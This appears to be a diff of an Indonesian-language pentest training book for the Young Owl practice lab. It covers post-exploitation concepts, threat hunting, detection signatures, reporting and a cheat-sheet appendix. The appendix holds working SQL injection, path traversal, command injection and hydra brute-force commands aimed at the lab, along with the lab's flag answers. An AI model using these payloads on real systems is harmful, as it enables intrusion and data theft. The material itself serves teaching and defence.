+      Isinya bisa memuat variabel environment, versi, bahkan secret — flag "debug endpoint" ada di
+      sini. <strong>Perbaikan:</strong> jangan pernah mengekspos endpoint debug di produksi; kalaupun
+      ada, kunci di balik autentikasi &amp; feature flag yang mati secara default.
+    </p>
+    <div class="detect">
+      <b>Jejak:</b> akses ke <code>/system/debug</code>, <code>/.env</code>, atau jalur config tanpa
+      sesi — monitor menandainya sebagai <code>recon</code>/kebocoran konfigurasi.
+    </div>
+
+    <h3>5.8 Merangkai temuan (chaining)</h3>
+    <p>
+      Pentester nyata jarang berhenti di satu celah. Contoh rantai di lab: kebocoran debug (5.7)
+      membocorkan sebuah email → enumerasi login mengonfirmasi email valid (5.6) → brute force
+      menemukan password → sebagai user, IDOR (5.3) membuka data admin. Setiap langkah memperbesar
+      dampak langkah sebelumnya. Dalam laporan, rantai seperti ini dinilai lebih tinggi daripada
+      jumlah celah individualnya, karena menunjukkan dampak dunia nyata.
+    </p>
 
     <!-- CH 6 -->
     <h2 class="chapter">
@@ -797,330 +1030,339 @@ curl -s -G "$LAB/api/v1/targets/search" \
       Anda sendiri yang terisolasi, dan tujuannya edukatif: memahami cara kerja backdoor agar Anda
       bisa <em>mengenali, mendeteksi, dan membersihkannya</em>. Buku ini sengaja tidak memberi
       teknik penyamaran dari antivirus/EDR atau persistence tingkat lanjut untuk mengelabui defender
-      — itu bukan yang membuat Anda mahir, dan menyalahgunakannya di sistem orang lain adalah
-      pidana.
+      di sistem nyata — itu bukan yang membuat Anda mahir, dan menyalahgunakannya di sistem orang
+      lain adalah pidana. Yang membuat Anda mahir adalah memahami mekanismenya cukup dalam untuk
+      menutupnya.
     </div>
+
     <h3>6.1 Apa yang terjadi setelah RCE</h3>
     <p>
       Dari celah command injection (5.5), Anda sudah bisa menjalankan perintah. Post-exploitation
       adalah langkah yang biasanya menyusul: orientasi, mencari data, lalu mencoba mempertahankan
       akses. Mari jalankan masing-masing di lab dan lihat bagaimana isolasi lab menggagalkannya —
-      itu pelajaran terbaiknya.
+      itu pelajaran terbaiknya, karena menunjukkan secara konkret mengapa tiap kontrol keamanan ada.
     </p>
     <h4>Orientasi (situational awareness)</h4>
-    <pre><code><span class="c"># via endpoint RCE yang sama</span>
-{"host":"localhost; id; uname -a; pwd; ls -la"}
-{"host":"localhost; env"}        <span class="c"># sering membocorkan flag/konfigurasi</span></code></pre>
+    <p>Hal pertama yang dilakukan penyerang setelah masuk adalah memahami "saya ada di mana":</p>
+    <pre><code><span class="c"># via endpoint RCE yang sama, satu per satu</span>
+{"host":"localhost; id"}          <span class="c"># siapa saya? (user, grup)</span>
+{"host":"localhost; uname -a"}     <span class="c"># kernel &amp; arsitektur</span>
+{"host":"localhost; pwd; ls -la"}  <span class="c"># direktori kerja &amp; isinya</span>
+{"host":"localhost; env"}          <span class="c"># sering membocorkan flag/konfigurasi</span></code></pre>
+    <p>
+      Perhatikan: di lab, <code>id</code> kemungkinan menunjukkan user tak-berhak (bukan root) karena
+      container dijalankan sebagai non-root dengan <code>no-new-privileges</code> — mitigasi pertama
+      yang Anda lihat bekerja.
+    </p>
+
     <h3>6.2 Web shell — dan kenapa gagal di lab</h3>
     <p>
       Web shell adalah berkas yang bisa dieksekusi, ditanam ke direktori web, lalu dipanggil lewat
-      URL untuk menjalankan perintah kapan saja. Secara konsep, penyerang akan mencoba menulisnya
-      lewat RCE atau celah upload:
+      URL untuk menjalankan perintah kapan saja — sebuah "pintu belakang" yang bertahan selama berkas
+      itu ada. Secara konsep, penyerang akan mencoba menulisnya lewat RCE atau celah upload:
     </p>
     <pre><code><span class="c"># upaya menulis berkas ke disk (konsep)</span>
-{"host":"localhost; echo PAYLOAD > /app/public/shell.js"}</code></pre>
+{"host":"localhost; echo PAYLOAD &gt; /app/public/shell.js"}</code></pre>
     <p>
       Di lab Young Owl ini <strong>gagal</strong>: root filesystem container bersifat
-      <em>read-only</em>, jadi tidak ada tempat menulis web shell. Inilah mitigasi "read-only
-      filesystem" bekerja persis sebagaimana mestinya. Pelajarannya: web shell hanya mungkin bila
-      aplikasi punya direktori yang dapat ditulis dan dilayani — hilangkan itu dan kelas serangan
-      ini lenyap.
+      <em>read-only</em> (<code>read_only: true</code>), jadi tidak ada tempat menulis web shell.
+      Inilah mitigasi "read-only filesystem" bekerja persis sebagaimana mestinya. Pelajarannya: web
+      shell hanya mungkin bila aplikasi punya direktori yang dapat ditulis <em>dan</em> dilayani
+      sebagai web — hilangkan salah satunya dan seluruh kelas serangan ini lenyap.
     </p>
+    <div class="detect">
+      <b>Jejak web shell (bila berhasil di sistem rentan):</b> berkas baru di direktori web yang
+      tidak ada di repository Git; request ke berkas bernama aneh (<code>shell.js</code>,
+      <code>cmd.php</code>) yang membawa parameter perintah; proses anak shell dari server web.
+    </div>
+
     <h3>6.3 Reverse &amp; bind shell (konsep + kenapa mandul di sini)</h3>
     <p>
       <strong>Bind shell</strong>: korban membuka port dan mendengar; penyerang menyambung masuk —
       mudah diblokir firewall inbound. <strong>Reverse shell</strong>: korban menyambung
-      <em>keluar</em> ke penyerang, mengalahkan firewall inbound. Secara konsep penyerang akan
-      mencoba:
+      <em>keluar</em> ke penyerang, mengalahkan firewall inbound, itulah kenapa lebih disukai
+      penyerang. Secara konsep penyerang akan mencoba membuat proses korban menyambung ke mesin
+      penyerang:
     </p>
     <pre><code><span class="c"># konsep reverse shell dari korban ke mesin penyerang</span>
-{"host":"localhost; <em>&lt;koneksi keluar ke IP penyerang&gt;</em>"}</code></pre>
+{"host":"localhost; &lt;koneksi keluar ke IP penyerang&gt;"}</code></pre>
     <p>
       Di lab ini juga <strong>gagal</strong>: <code>infrastructure/lab/firewall.sh</code> men-drop
       semua koneksi keluar baru dari jaringan lab (egress filtering). Reverse shell tidak punya
       tujuan untuk disambungi. Inilah alasan egress filtering begitu ampuh — ia mematikan seluruh
-      keluarga teknik "phone home" sekaligus.
+      keluarga teknik "phone home" sekaligus: reverse shell, exfiltrasi data, unduhan payload tahap
+      kedua, dan command &amp; control.
     </p>
+    <div class="detect">
+      <b>Jejak reverse shell:</b> upaya koneksi keluar dari proses server ke IP/port tak dikenal —
+      di lab ini terlihat sebagai paket yang di-drop firewall. Memantau egress adalah salah satu
+      deteksi paling berharga yang bisa Anda miliki.
+    </div>
+
     <h3>6.4 Persistence — di mana penyerang bersembunyi</h3>
     <p>
-      Persistence adalah apa pun yang membuat akses bertahan melewati reboot atau reset password:
+      Persistence adalah apa pun yang membuat akses bertahan melewati reboot atau reset password.
+      Memahami tempat-tempat ini penting bukan untuk memasangnya, melainkan untuk
+      <em>memeriksanya</em> saat berburu ancaman:
     </p>
     <table>
-      <tr>
-        <th>Mekanisme</th>
-        <th>Tempat memeriksa (sisi pemilik)</th>
-      </tr>
-      <tr>
-        <td>Cron</td>
-        <td><code>/etc/crontab</code>, <code>/etc/cron.*</code>, <code>crontab -l</code></td>
-      </tr>
-      <tr>
-        <td>systemd</td>
-        <td><code>systemctl list-timers</code>, <code>/etc/systemd/system/</code></td>
-      </tr>
-      <tr>
-        <td>Berkas rc shell</td>
-        <td><code>~/.bashrc</code>, <code>/etc/profile.d</code></td>
-      </tr>
-      <tr>
-        <td>Akun / kunci baru</td>
-        <td><code>/etc/passwd</code>, <code>~/.ssh/authorized_keys</code></td>
-      </tr>
-      <tr>
-        <td>Web shell / token</td>
-        <td>Berkas baru di direktori web; token API tak dikenal</td>
-      </tr>
+      <tr><th>Mekanisme</th><th>Tempat memeriksa (sisi pemilik)</th></tr>
+      <tr><td>Cron</td><td><code>/etc/crontab</code>, <code>/etc/cron.*</code>, <code>crontab -l</code></td></tr>
+      <tr><td>systemd</td><td><code>systemctl list-timers</code>, <code>/etc/systemd/system/</code></td></tr>
+      <tr><td>Berkas rc shell</td><td><code>~/.bashrc</code>, <code>/etc/profile.d</code></td></tr>
+      <tr><td>Akun / kunci baru</td><td><code>/etc/passwd</code>, <code>~/.ssh/authorized_keys</code></td></tr>
+      <tr><td>Web shell / token</td><td>Berkas baru di direktori web; token API tak dikenal</td></tr>
+      <tr><td>Library/paket dimodifikasi</td><td>Hash paket vs lockfile; berkas library dengan mtime aneh</td></tr>
     </table>
     <p>
       Di lab, database dummy hidup di RAM dan ter-reset, filesystem read-only, egress mati — tiga
       hal yang membuat persistence tidak bisa menancap. Di server produksi Anda (control center),
       ketiga properti itu adalah hal pertama yang harus Anda pastikan ada.
     </p>
+
     <h3>6.5 Perburuan &amp; pembersihan (alur defender)</h3>
     <div class="detect">
       <b>Threat hunting di server Anda sendiri.</b>
       <ol style="margin-top: 2mm">
         <li>
           Kumpulkan keadaan sekarang: scheduled task, service, startup file, user, socket yang
-          mendengar (<code>ss -tlnp</code>), authorized key.
+          mendengar (<code>ss -tlnp</code>), authorized key, proses berjalan (<code>ps aux</code>).
         </li>
         <li>
           Bandingkan dengan baseline atau image bersih / repository Git (apa yang
-          <em>seharusnya</em> ada).
+          <em>seharusnya</em> ada). Perbedaan = kandidat investigasi.
         </li>
-        <li>Selidiki yang baru: kapan dibuat, oleh siapa, menjalankan apa.</li>
+        <li>Selidiki yang baru: kapan dibuat (mtime), oleh siapa, menjalankan apa.</li>
         <li>
           Hapus mekanismenya <em>dan</em> akses yang diberikannya (rotasi kredensial, hapus
-          kunci/akun).
+          kunci/akun, cabut token).
         </li>
         <li>
           Cari akar masalah — persistence hanya gejala dari cara mereka masuk (celah di Bab 5).
+          Menutup backdoor tanpa menutup celah masuk = mereka kembali besok.
         </li>
       </ol>
     </div>
+    <h4>Perintah perburuan cepat</h4>
+    <pre><code>crontab -l; sudo cat /etc/crontab; ls -la /etc/cron.*
+systemctl list-timers --all
+ss -tlnp                         <span class="c"># apa yang mendengar koneksi?</span>
+sudo cat /etc/passwd | tail      <span class="c"># akun baru di akhir?</span>
+cat ~/.ssh/authorized_keys       <span class="c"># kunci tak dikenal?</span>
+cd /path/ke/app &amp;&amp; git status    <span class="c"># berkas web yang berubah/baru?</span></code></pre>
     <p>
       Dokumentasikan setiap artefak sebagai bukti sebelum dihapus (Bab 8). Karena lab terisolasi dan
-      ter-reset, Anda bisa melatih seluruh siklus ini berulang tanpa risiko.
+      ter-reset, Anda bisa melatih seluruh siklus ini berulang tanpa risiko — serang, buru, bersihkan,
+      reset, ulangi.
     </p>
 
     <!-- CH 7 -->
-    <h2 class="chapter"><span class="n">BAB 7</span>Deteksi &amp; Monitoring Serangan</h2>
+    <h2 class="chapter"><span class="n">BAB 7</span>Deteksi, Monitoring &amp; Blue Team</h2>
     <p class="lead">
       Sisi lain dari pentest: setelah menyerang, lihat serangan itu dari kursi defender. Setiap
       request yang Anda kirim di Bab 5–6 meninggalkan jejak yang bisa dibaca seperti layaknya
-      seorang analis SOC membaca sniffing/IDS.
+      seorang analis SOC membaca sniffing/IDS. Inilah tepatnya cara kerja tab monitor di Young Owl.
     </p>
+
     <h3>7.1 Cara kerja monitoring web (seperti "sniffing")</h3>
     <p>
       Sebuah web monitor/IDS sederhana mengamati tiap request yang masuk, lalu mencocokkannya dengan
       pola serangan yang dikenal. Elemen yang dicatat per request: waktu, IP sumber, metode, path,
-      parameter, user-agent, dan status balasan. "Sniffing" di konteks web artinya memeriksa isi
-      request — bukan sekadar menghitung jumlahnya.
+      parameter, user-agent, dan status balasan. "Sniffing" di konteks web artinya memeriksa
+      <em>isi</em> request — bukan sekadar menghitung jumlahnya. Young Owl menerapkan ini dengan
+      sebuah classifier yang murni (tanpa dependensi) yang mengubah bentuk request menjadi satu label
+      kelas serangan terkuat.
     </p>
+
     <h3>7.2 Signature per kelas serangan</h3>
     <p>
-      Inilah "kamus" yang dipakai monitor untuk mengklasifikasi aktivitas Anda sendiri dari Bab 5:
+      Inilah "kamus" yang dipakai monitor Young Owl untuk mengklasifikasi aktivitas Anda sendiri dari
+      Bab 5. Urutannya penting: request yang cocok beberapa pola diberi label yang <em>paling
+      berbahaya</em> (RCE didahulukan, recon paling akhir):
     </p>
     <table>
-      <tr>
-        <th>Kelas</th>
-        <th>Signature yang dicari</th>
-      </tr>
-      <tr>
-        <td>Recon</td>
-        <td>
-          Akses <code>robots.txt</code> lalu jalur terlarangnya; hit <code>/system/debug</code>;
-          user-agent <code>nikto</code>/<code>whatweb</code>; lonjakan 404.
-        </td>
-      </tr>
-      <tr>
-        <td>SQLi</td>
-        <td>
-          <code>'</code>, <code>UNION</code>, <code>SELECT</code>, <code>ORDER BY</code>,
-          <code>--</code> di parameter; error 500 beruntun.
-        </td>
-      </tr>
-      <tr>
-        <td>XSS</td>
-        <td>
-          <code>&lt;script</code>, <code>&lt;img</code>, <code>onerror=</code>,
-          <code>javascript:</code> di field tersimpan.
-        </td>
-      </tr>
-      <tr>
-        <td>IDOR</td>
-        <td>Satu akun mengakses deret id objek milik akun lain.</td>
-      </tr>
-      <tr>
-        <td>Traversal</td>
-        <td><code>../</code>, <code>....//</code>, nama file sensitif.</td>
-      </tr>
-      <tr>
-        <td>RCE</td>
-        <td>
-          Metakarakter shell <code>;</code> <code>|</code> <code>$(</code> <code>`</code>; dari
-          server, proses anak tak terduga.
-        </td>
-      </tr>
-      <tr>
-        <td>Auth</td>
-        <td>Banyak login gagal / banyak email diuji dari satu sumber (brute force / enumerasi).</td>
-      </tr>
+      <tr><th>Kelas</th><th>Severity</th><th>Signature yang dicari</th></tr>
+      <tr><td>RCE</td><td>Critical</td><td>Metakarakter shell <code>;</code> <code>|</code> <code>$(</code> <code>`</code> <code>&amp;&amp;</code>, <code>sleep</code>, <code>| id</code> di input.</td></tr>
+      <tr><td>SQLi</td><td>High</td><td><code>'</code>, <code>%27</code>, <code>UNION SELECT</code>, <code>SELECT...FROM</code>, <code>ORDER BY n</code>, <code>--</code>.</td></tr>
+      <tr><td>Traversal</td><td>High</td><td><code>../</code>, <code>..\\</code>, <code>....//</code>, <code>%2e%2e</code>.</td></tr>
+      <tr><td>XSS</td><td>Medium</td><td><code>&lt;script</code>, <code>onerror=</code>, <code>onload=</code>, <code>&lt;img</code>, <code>&lt;svg</code>, <code>javascript:</code>.</td></tr>
+      <tr><td>IDOR</td><td>Medium</td><td>Akses <code>/assessments/&lt;id&gt;/export</code> lintas pemilik.</td></tr>
+      <tr><td>Auth</td><td>Medium</td><td>Login POST gagal (401) berulang, atau user-agent <code>hydra</code>.</td></tr>
+      <tr><td>Recon</td><td>Low</td><td>User-agent scanner (<code>nikto</code>, <code>sqlmap</code>, <code>nmap</code>, <code>ffuf</code>, …), akses <code>robots.txt</code>/<code>/system/debug</code>/<code>/.env</code>.</td></tr>
     </table>
+
     <h3>7.3 Dari log ke alert</h3>
     <p>Alur deteksi yang baik berlapis sehingga sulit dielakkan sekaligus:</p>
     <ol>
-      <li>
-        <strong>Kumpulkan</strong> log akses di satu tempat (jangan tersebar di tiap container).
-      </li>
-      <li>
-        <strong>Cocokkan</strong> tiap request dengan signature di atas; beri label kelas &amp;
-        tingkat.
-      </li>
-      <li>
-        <strong>Korelasikan</strong> lintas waktu dan sumber (10 login gagal lebih bermakna dari 1).
-      </li>
-      <li>
-        <strong>Pantau egress</strong> — apa pun yang mencoba keluar dari jaringan lab adalah
-        anomali.
-      </li>
-      <li>
-        <strong>Simpan log aman</strong> ke penyimpanan append-only agar tak bisa dihapus penyerang.
-      </li>
+      <li><strong>Kumpulkan</strong> log akses di satu tempat (jangan tersebar di tiap container).</li>
+      <li><strong>Cocokkan</strong> tiap request dengan signature di atas; beri label kelas &amp; tingkat.</li>
+      <li><strong>Korelasikan</strong> lintas waktu dan sumber (10 login gagal lebih bermakna dari 1).</li>
+      <li><strong>Pantau egress</strong> — apa pun yang mencoba keluar dari jaringan lab adalah anomali.</li>
+      <li><strong>Simpan log aman</strong> ke penyimpanan append-only agar tak bisa dihapus penyerang.</li>
     </ol>
-    <div class="note">
-      <b>Menuju fitur in-app.</b> Young Owl sedang dikembangkan agar tab-tab operator
-      (Reconnaissance, Exploitation, dll.) menampilkan aktivitas ini secara langsung — sebuah
-      monitor serangan hidup terhadap lab Anda. Bab ini adalah model mental di baliknya: Anda
-      menyerang lab dari Kali, lalu melihat tiap langkah muncul terklasifikasi di layar.
-    </div>
-    <h3>7.4 Latihan: serang lalu amati</h3>
     <p>
-      Jalankan ulang satu serangan dari Bab 5 (misalnya SQLi atau brute force login), lalu periksa
-      log lab:
+      Perhatikan konsep <strong>korelasi</strong>: satu login gagal tidak menarik, tetapi 50 dalam
+      semenit dari satu IP adalah serangan. Satu akses 404 biasa, ratusan 404 berurutan adalah
+      content discovery. Deteksi yang baik menimbang konteks, bukan hanya mencocokkan string.
     </p>
+
+    <h3>7.4 Monitor serangan in-app Young Owl</h3>
+    <div class="note">
+      <b>Fitur hidup.</b> Tab operator Young Owl (Exploitation Lab, Reconnaissance, dll.) kini
+      menampilkan aktivitas ini secara langsung — sebuah monitor serangan hidup terhadap lab Anda.
+      Arsitekturnya: salinan <em>lab</em> menuliskan tiap request terklasifikasi ke sebuah volume
+      log satu arah; control center membaca log itu (hanya-baca) dan menampilkannya. Anda menyerang
+      lab dari Kali, lalu melihat tiap langkah muncul terklasifikasi di layar dalam hitungan detik.
+    </div>
+    <p>Cara mencoba:</p>
+    <ol>
+      <li>Buka control center → tab <strong>Exploitation Lab</strong>.</li>
+      <li>Dari Kali, jalankan satu serangan dari Bab 5 terhadap <code>$LAB</code>.</li>
+      <li>Perhatikan baris baru muncul di tabel monitor: waktu, kelas (SQLi/RCE/…), sumber, request, signature, status.</li>
+    </ol>
+
+    <h3>7.5 Latihan: serang lalu amati (dua cara)</h3>
+    <p>Cara in-app di 7.4 adalah yang utama. Untuk melihat log mentah, amati container lab:</p>
     <pre><code><span class="c"># di VPS, amati log container lab saat Anda menyerang dari Kali</span>
 docker compose -f docker-compose.lab.yml -p youngowl-lab logs -f api</code></pre>
     <p>
       Cocokkan baris log dengan signature di 7.2. Inilah inti kerja seorang analis: menghubungkan
-      apa yang terlihat di log dengan teknik yang menyebabkannya.
+      apa yang terlihat di log dengan teknik yang menyebabkannya, lalu memutuskan apakah itu ancaman.
     </p>
+    <div class="detect">
+      <b>Latihan blue team.</b> Minta teman menyerang lab tanpa memberi tahu teknik apa yang dipakai,
+      lalu Anda tebak kelas serangannya hanya dari monitor. Ini melatih mata Anda membaca serangan
+      secara nyata.
+    </div>
 
     <!-- CH 8 -->
-    <h2 class="chapter"><span class="n">BAB 8</span>Pelaporan</h2>
+    <h2 class="chapter"><span class="n">BAB 8</span>Pelaporan &amp; Remediasi</h2>
     <p class="lead">
-      Temuan tanpa laporan yang jelas tidak bisa diperbaiki. Di sinilah siklus ditutup.
+      Temuan tanpa laporan yang jelas tidak bisa diperbaiki. Di sinilah siklus ditutup — dan di dunia
+      nyata, laporan adalah satu-satunya deliverable yang dilihat klien.
     </p>
-    <h3>CVSS 3.1 singkat</h3>
-    <p>CVSS mengubah kerentanan jadi skor 0–10. Contoh vektor:</p>
+
+    <h3>8.1 CVSS 3.1 singkat</h3>
+    <p>CVSS mengubah kerentanan jadi skor 0–10 yang objektif. Contoh vektor untuk RCE:</p>
     <pre><code>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H  →  9.8 (Critical)</code></pre>
     <table>
-      <tr>
-        <th>Skor</th>
-        <th>Tingkat</th>
-      </tr>
-      <tr>
-        <td>0.1–3.9</td>
-        <td>Low</td>
-      </tr>
-      <tr>
-        <td>4.0–6.9</td>
-        <td>Medium</td>
-      </tr>
-      <tr>
-        <td>7.0–8.9</td>
-        <td>High</td>
-      </tr>
-      <tr>
-        <td>9.0–10.0</td>
-        <td>Critical</td>
-      </tr>
+      <tr><th>Metrik</th><th>Arti singkat</th></tr>
+      <tr><td>AV (Attack Vector)</td><td>Dari mana diserang: N=jaringan, L=lokal.</td></tr>
+      <tr><td>AC (Attack Complexity)</td><td>Seberapa sulit: L=rendah, H=tinggi.</td></tr>
+      <tr><td>PR (Privileges Required)</td><td>Hak yang dibutuhkan: N=tanpa, L=rendah, H=tinggi.</td></tr>
+      <tr><td>UI (User Interaction)</td><td>Perlu korban beraksi? N=tidak, R=perlu.</td></tr>
+      <tr><td>C/I/A</td><td>Dampak ke Kerahasiaan/Integritas/Ketersediaan.</td></tr>
     </table>
-    <h3>Menulis temuan</h3>
+    <table>
+      <tr><th>Skor</th><th>Tingkat</th></tr>
+      <tr><td>0.1–3.9</td><td>Low</td></tr>
+      <tr><td>4.0–6.9</td><td>Medium</td></tr>
+      <tr><td>7.0–8.9</td><td>High</td></tr>
+      <tr><td>9.0–10.0</td><td>Critical</td></tr>
+    </table>
+
+    <h3>8.2 Menulis temuan</h3>
     <p>Temuan yang baik bisa direproduksi dan ditindaklanjuti. Sertakan:</p>
     <ol>
       <li><strong>Judul &amp; tingkat</strong> (dengan vektor CVSS).</li>
-      <li><strong>Deskripsi</strong> dalam bahasa sederhana.</li>
-      <li><strong>Bukti</strong>: request/payload persis agar bisa diulang.</li>
-      <li><strong>Dampak</strong>: apa yang didapat penyerang.</li>
+      <li><strong>Deskripsi</strong> dalam bahasa sederhana — apa celahnya, di mana.</li>
+      <li><strong>Bukti</strong>: request/payload persis agar bisa diulang (langkah demi langkah).</li>
+      <li><strong>Dampak</strong>: apa yang didapat penyerang (data, kendali, akses).</li>
       <li><strong>Perbaikan</strong>: langkah konkret, bukan "sanitasi input".</li>
       <li><strong>Deteksi</strong>: signature yang menandai serangan ini (dari Bab 7).</li>
     </ol>
+    <h4>Contoh temuan</h4>
+    <pre><code>Judul   : SQL Injection pada pencarian target (Critical, CVSS 9.1)
+Lokasi  : GET /api/v1/targets/search, parameter q
+Bukti   : q=zzz' UNION SELECT ... FROM lab_flags--  mengembalikan isi tabel flag
+Dampak  : Pembacaan seluruh basis data, termasuk data pengguna lain
+Perbaikan: Gunakan parameterized query; validasi tipe input
+Deteksi : Kutip + UNION/SELECT di parameter; error 500 beruntun (kelas sqli)</code></pre>
+
+    <h3>8.3 Retest &amp; menutup siklus</h3>
+    <p>
+      Laporan bukan akhir. Setelah perbaikan diterapkan, ulangi serangan yang sama untuk memastikan
+      celah benar-benar tertutup (<em>retest</em>) — dan pastikan perbaikan tidak merusak fungsi lain.
+      Di Young Owl, bandingkan perilaku salinan lab (rentan) dengan salinan normal (sudah diperbaiki):
+      request yang membocorkan flag di lab seharusnya menjawab 404/aman di control center. Itulah bukti
+      perbaikan bekerja.
+    </p>
     <p>
       Di Young Owl, masukkan tiap temuan ke assessment lalu klik <strong>Generate report</strong> —
-      hasilnya Markdown atau JSON yang bisa diunduh. Itulah deliverable Anda.
+      hasilnya Markdown atau JSON yang bisa diunduh. Itulah deliverable Anda, dan menutup lingkaran
+      penuh: recon → scan → exploit → deteksi → laporan → perbaikan → retest.
     </p>
 
     <!-- APPENDIX -->
     <h2 class="chapter">
-      <span class="n">LAMPIRAN A</span>Cheat sheet, tanda serangan &amp; daftar flag
+      <span class="n">LAMPIRAN A</span>Cheat sheet, signature, glosarium &amp; daftar flag
     </h2>
-    <h3>Perintah ofensif yang sering dipakai</h3>
+    <h3>A.1 Perintah ofensif yang sering dipakai</h3>
     <pre><code><span class="c"># Recon</span>
-nmap -sn &lt;ip&gt;/32
+nmap -sn &lt;ip&gt;
 nmap -sS -p- &lt;ip&gt;
-nmap -sV --script=http-title,http-headers -p 8080 &lt;ip&gt;
+nmap -sV -sC --script=http-title,http-headers,http-methods -p 8080 &lt;ip&gt;
 ffuf -u $LAB/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,301,401,403
+ffuf -u "$LAB/api/v1/targets/search?FUZZ=test" -w .../burp-parameter-names.txt -mc 200 -fs 0
 
 <span class="c"># Vuln scan</span>
 whatweb $LAB ; wafw00f $LAB
-nikto -h $LAB ; nuclei -u $LAB
-sqlmap -u "$LAB/api/v1/targets/search?q=1" --batch --level=2
+nikto -h $LAB ; nuclei -u $LAB -severity medium,high,critical
+sqlmap -u "$LAB/api/v1/targets/search?q=1" --batch --level=2 --risk=2
 
 <span class="c"># Exploit (lab Anda sendiri)</span>
-curl -s -G "$LAB/api/v1/targets/search" --data-urlencode "q=zzz' UNION SELECT ... FROM lab_flags-- "
+curl -s -G "$LAB/api/v1/targets/search" --data-urlencode "q=zzz' UNION SELECT id,name,value,hint,'x','x' FROM lab_flags-- "
+curl -s -b cookies.txt "$LAB/api/v1/assessments/&lt;id&gt;/export"
 curl -s -b cookies.txt "$LAB/api/v1/files?name=....//secret/flag.txt"
 curl -s -b cookies.txt -X POST "$LAB/api/v1/tools/lookup" -H 'content-type: application/json' -d '{"host":"localhost; id"}'
-hydra -l intern@youngowl.lab -P rockyou.txt &lt;ip&gt; -s 8080 http-post-form "/api/v1/auth/login:email=^USER^&amp;password=^PASS^:No account"</code></pre>
-    <h3>Tanda serangan (sisi defender)</h3>
+hydra -l intern@youngowl.lab -P rockyou.txt &lt;ip&gt; -s 8080 http-post-form "/api/v1/auth/login:email=^USER^&amp;password=^PASS^:No account"
+curl -s $LAB/api/v1/system/debug | jq</code></pre>
+
+    <h3>A.2 Tanda serangan &amp; perburuan (sisi defender)</h3>
     <pre><code><span class="c"># amati log lab saat menyerang</span>
 docker compose -f docker-compose.lab.yml -p youngowl-lab logs -f api
 
 <span class="c"># periksa persistence di server Anda</span>
-crontab -l ; systemctl list-timers ; ss -tlnp
-cat ~/.ssh/authorized_keys ; git status   <span class="c"># file web tak dikenal?</span></code></pre>
-    <h3>Daftar flag lab</h3>
+crontab -l ; systemctl list-timers --all ; ss -tlnp
+sudo cat /etc/passwd | tail ; cat ~/.ssh/authorized_keys
+cd /path/ke/app &amp;&amp; git status     <span class="c"># file web tak dikenal?</span></code></pre>
+
+    <h3>A.3 Signature ringkas per kelas</h3>
     <table>
-      <tr>
-        <th>Tantangan</th>
-        <th>Tingkat</th>
-        <th>Flag (default)</th>
-      </tr>
-      <tr>
-        <td>Debug endpoint</td>
-        <td>Beginner</td>
-        <td><code>YO{d3bug_3ndp01nts_l34k_s3cr3ts}</code></td>
-      </tr>
-      <tr>
-        <td>SQL injection</td>
-        <td>Beginner</td>
-        <td><code>YO{un10n_s3l3ct_th3_0wl}</code></td>
-      </tr>
-      <tr>
-        <td>IDOR</td>
-        <td>Beginner</td>
-        <td><code>YO{1d0r_m34ns_n0_0wn3r_ch3ck}</code></td>
-      </tr>
-      <tr>
-        <td>Path traversal</td>
-        <td>Intermediate</td>
-        <td><code>YO{d0t_d0t_sl4sh_w4lks_0ut}</code></td>
-      </tr>
-      <tr>
-        <td>Command injection</td>
-        <td>Advanced</td>
-        <td><code>YO{p1ng_0f_d34th_sh3ll}</code></td>
-      </tr>
-      <tr>
-        <td>Stored XSS</td>
-        <td>Intermediate</td>
-        <td>buktikan eksekusi skrip</td>
-      </tr>
-      <tr>
-        <td>Auth failures</td>
-        <td>Beginner</td>
-        <td>login sebagai <code>intern</code></td>
-      </tr>
+      <tr><th>Kelas</th><th>Pola kunci</th></tr>
+      <tr><td>recon</td><td>UA scanner; <code>robots.txt</code>; <code>/system/debug</code>; <code>/.env</code>; lonjakan 404</td></tr>
+      <tr><td>sqli</td><td><code>'</code> <code>%27</code> <code>UNION SELECT</code> <code>ORDER BY</code> <code>--</code></td></tr>
+      <tr><td>xss</td><td><code>&lt;script</code> <code>&lt;img</code> <code>onerror=</code> <code>javascript:</code></td></tr>
+      <tr><td>traversal</td><td><code>../</code> <code>....//</code> <code>%2e%2e</code></td></tr>
+      <tr><td>idor</td><td>export lintas id/pemilik</td></tr>
+      <tr><td>rce</td><td><code>;</code> <code>|</code> <code>$(</code> <code>`</code> <code>&amp;&amp;</code> <code>sleep</code></td></tr>
+      <tr><td>auth</td><td>login 401 berulang; UA <code>hydra</code></td></tr>
+    </table>
+
+    <h3>A.4 Glosarium</h3>
+    <table>
+      <tr><th>Istilah</th><th>Arti</th></tr>
+      <tr><td>Payload</td><td>Input yang disusun untuk memicu/membuktikan celah.</td></tr>
+      <tr><td>IDOR</td><td>Akses objek langsung tanpa cek kepemilikan.</td></tr>
+      <tr><td>RCE</td><td>Remote Code Execution — menjalankan perintah di server.</td></tr>
+      <tr><td>Egress</td><td>Lalu lintas keluar dari jaringan; memblokirnya mematikan reverse shell.</td></tr>
+      <tr><td>Persistence</td><td>Mekanisme agar akses bertahan melewati reboot/reset.</td></tr>
+      <tr><td>WAF</td><td>Web Application Firewall — penyaring request berpola serangan.</td></tr>
+      <tr><td>CVSS</td><td>Sistem skor keparahan kerentanan (0–10).</td></tr>
+      <tr><td>False positive</td><td>Temuan scanner yang ternyata bukan celah nyata.</td></tr>
+      <tr><td>Chaining</td><td>Merangkai beberapa celah agar dampaknya membesar.</td></tr>
+    </table>
+
+    <h3>A.5 Daftar flag lab</h3>
+    <table>
+      <tr><th>Tantangan</th><th>Tingkat</th><th>Flag (default)</th></tr>
+      <tr><td>Debug endpoint</td><td>Beginner</td><td><code>YO{d3bug_3ndp01nts_l34k_s3cr3ts}</code></td></tr>
+      <tr><td>SQL injection</td><td>Beginner</td><td><code>YO{un10n_s3l3ct_th3_0wl}</code></td></tr>
+      <tr><td>IDOR</td><td>Beginner</td><td><code>YO{1d0r_m34ns_n0_0wn3r_ch3ck}</code></td></tr>
+      <tr><td>Path traversal</td><td>Intermediate</td><td><code>YO{d0t_d0t_sl4sh_w4lks_0ut}</code></td></tr>
+      <tr><td>Command injection</td><td>Advanced</td><td><code>YO{p1ng_0f_d34th_sh3ll}</code></td></tr>
+      <tr><td>Stored XSS</td><td>Intermediate</td><td>buktikan eksekusi skrip</td></tr>
+      <tr><td>Auth failures</td><td>Beginner</td><td>login sebagai <code>intern</code></td></tr>
     </table>
     <div class="note">
       Nilai flag berasal dari variabel environment, jadi ubah untuk sesi kelompok. Lihat
